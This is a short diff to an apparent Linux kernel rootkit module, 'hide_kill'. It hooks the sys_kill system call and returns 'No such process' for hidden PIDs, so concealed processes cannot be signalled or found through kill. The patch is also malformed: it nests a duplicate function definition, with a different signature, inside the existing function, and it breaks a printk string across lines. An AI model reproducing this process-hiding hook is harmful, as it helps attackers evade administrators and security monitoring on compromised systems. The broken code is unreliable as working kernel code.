@@ -33,8 +33,22 @@ static asmlinkage long hooked_sys_kill(const struct pt_regs *regs)
         return original_sys_kill(pid, sig);
     }
 
+    // Our hooked sys_kill function
+static asmlinkage long hooked_sys_kill(pid_t pid, int sig)
+{
+    if (is_pid_hidden(pid)) {
+        // Return "No such process"
+        return -ESRCH;
+    }
+
+    // If the pid is not hidden, call the original function, but check if it's valid first
+    if (original_sys_kill) {
+        return original_sys_kill(pid, sig);
+    }
+
     // Fallback if original_sys_kill is NULL
-    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!\n");
+    printk(KERN_WARNING "[hide_kill] original_sys_kill is NULL!
+");
     return -ENOSYS;
 }
 
